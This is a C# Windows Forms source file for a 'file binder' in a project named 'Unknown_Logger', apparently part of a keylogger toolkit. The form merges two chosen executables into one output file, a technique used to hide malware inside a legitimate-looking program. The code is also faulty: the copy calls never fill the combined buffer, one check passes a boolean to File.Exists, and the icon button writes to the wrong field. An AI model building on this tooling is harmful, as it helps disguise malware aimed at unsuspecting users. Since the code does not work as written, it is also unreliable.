using System;
using System.IO;
using System.Windows.Forms;

namespace Unknown_Logger.Forms
{
    public partial class FileBinderForm : MetroFramework.Forms.MetroForm
    {
        public FileBinderForm()
        {
            InitializeComponent();
        }

        private void BTN_GetFileLocationOne_Click(object sender, EventArgs e)
        {
            TB_FileOneLocation.Text = UnknownLibrary.Unknown.GetFilePath("All Files(*.*)|Exe File (*.exe)");        }

        private void BTN_GetFileLocationTwo_Click(object sender, EventArgs e)
        {
            TB_FileTwoLocation.Text = UnknownLibrary.Unknown.GetFilePath("All Files(*.*)|Exe File (*.exe)");
        }

        private void BTN_GetIconLocation_Click(object sender, EventArgs e)
        {
            TB_FileTwoLocation.Text = UnknownLibrary.Unknown.GetFilePath("All Files(*.*)|Exe File (*.exe)");
        }

        private void BTN_BindFiles_Click(object sender, EventArgs e)
        {
            if(TB_FileOneLocation.Text != string.Empty && TB_FileTwoLocation.Text != string.Empty && TB_OutputFile.Text != string.Empty)
            {
                if (File.Exists(TB_FileOneLocation.Text) && File.Exists(TB_FileTwoLocation.Text) && File.Exists(TB_OutputFile.Text != string.Empty))
                {
                    byte[] fileOneBytes = File.ReadAllBytes(TB_FileOneLocation.Text);
                    byte[] fileTwoBytes = File.ReadAllBytes(TB_FileTwoLocation.Text);
                    byte[] combinedBytes = new byte[fileOneBytes.Length + fileTwoBytes.Length];
                    Array.Copy(fileOneBytes, 0, fileOneBytes, 0, fileOneBytes.Length);
                    Array.Copy(fileTwoBytes, 0, fileTwoBytes, 0, fileTwoBytes.Length);
                    File.WriteAllBytes(TB_OutputFile.Text, combinedBytes);
                } else
                {
                    MessageBox.Show("Can't find the given files or output file, please try again!", "Unknown Logger", MessageBoxButtons.OK, MessageBoxIcon.Error);
                }
            } else
            {
                MessageBox.Show("No files given to bind! Or no output file found...", "Unknown Logger", MessageBoxButtons.OK, MessageBoxIcon.Error);
            }
        }
    }
}
